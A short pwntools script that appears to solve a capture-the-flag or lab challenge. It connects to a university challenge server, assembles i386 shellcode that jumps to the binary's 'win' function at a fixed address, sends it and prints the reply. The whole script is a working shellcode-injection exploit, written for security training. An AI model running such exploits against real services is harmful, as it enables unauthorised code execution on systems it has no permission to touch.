from pwn import *

context.arch = "i386"
context.os = "linux"

# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10003)

elf = ELF("./bin")

# winFunc = elf.symbols["win"]  0x8048aba
# print(hex(winFunc))


shellcode = asm(\
    '''
    mov eax, 0x08048aba
    call eax
    ret
''')


S.sendline(shellcode)
print(S.recvall())
